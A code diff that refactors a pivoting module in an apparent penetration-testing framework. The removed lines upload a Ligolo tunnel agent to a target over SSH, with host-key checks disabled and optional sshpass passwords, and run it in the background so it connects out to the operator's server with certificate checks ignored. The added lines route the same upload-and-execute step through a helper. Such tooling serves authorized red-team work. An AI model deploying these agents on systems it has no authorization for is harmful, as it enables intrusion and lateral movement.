@@ -8,6 +8,7 @@ Supports multiple deployment methods: SMB, PSExec, WMIExec, SSH.
 from purplesploit.core.module import BaseModule
 from typing import Dict, Any, List
 import subprocess
+from purplesploit.modules.deploy._ssh import deploy_over_ssh
 import os
 import time
 from pathlib import Path
@@ -334,8 +335,6 @@ class LigoloPivotModule(BaseModule):
 
         rhost = self.get_option("RHOST")
         username = self.get_option("USERNAME")
-        password = self.get_option("PASSWORD")
-        ssh_key = self.get_option("SSH_KEY")
         agent_binary = self.get_option("AGENT_BINARY")
         ligolo_server = self.get_option("LIGOLO_SERVER")
 
@@ -345,66 +344,14 @@ class LigoloPivotModule(BaseModule):
                 "error": "Missing required options: RHOST, USERNAME, AGENT_BINARY"
             }
 
-        try:
-            # Upload agent via SCP
-            remote_path = "/tmp/ligolo-agent"
-
-            if ssh_key:
-                scp_cmd = [
-                    "scp", "-i", ssh_key,
-                    "-o", "StrictHostKeyChecking=no",
-                    agent_binary,
-                    f"{username}@{rhost}:{remote_path}"
-                ]
-            else:
-                # Use sshpass if password auth
-                scp_cmd = [
-                    "sshpass", "-p", password,
-                    "scp", "-o", "StrictHostKeyChecking=no",
-                    agent_binary,
-                    f"{username}@{rhost}:{remote_path}"
-                ]
-
-            self.log(f"Uploading agent to {rhost}...")
-            result = subprocess.run(scp_cmd, capture_output=True, text=True, timeout=30)
-
-            if result.returncode != 0:
-                return {
-                    "success": False,
-                    "error": f"Failed to upload agent: {result.stderr}"
-                }
-
-            # Make executable and run
-            if ssh_key:
-                ssh_cmd = [
-                    "ssh", "-i", ssh_key,
-                    "-o", "StrictHostKeyChecking=no",
-                    f"{username}@{rhost}",
-                    f"chmod +x {remote_path} && nohup {remote_path} -connect {ligolo_server} -ignore-cert &"
-                ]
-            else:
-                ssh_cmd = [
-                    "sshpass", "-p", password,
-                    "ssh", "-o", "StrictHostKeyChecking=no",
-                    f"{username}@{rhost}",
-                    f"chmod +x {remote_path} && nohup {remote_path} -connect {ligolo_server} -ignore-cert &"
-                ]
-
-            self.log("Executing agent on target...")
-            result = subprocess.run(ssh_cmd, capture_output=True, text=True, timeout=30)
-
-            self.log("Agent deployed successfully", "success")
-            return {
-                "success": True,
-                "output": result.stdout,
-                "method": "ssh"
-            }
-
-        except Exception as e:
-            return {
-                "success": False,
-                "error": f"SSH deployment failed: {str(e)}"
-            }
+        result = deploy_over_ssh(
+            self, host=rhost, username=username, local_file=agent_binary,
+            remote_path="/tmp/ligolo-agent",
+            arguments=["-connect", str(ligolo_server)], execute=True,
+            background=True, timeout=30,
+        )
+        result.setdefault("method", "ssh")
+        return result
 
     def deploy_via_nxc(self) -> dict:
         """Deploy agent via NetExec (nxc)."""
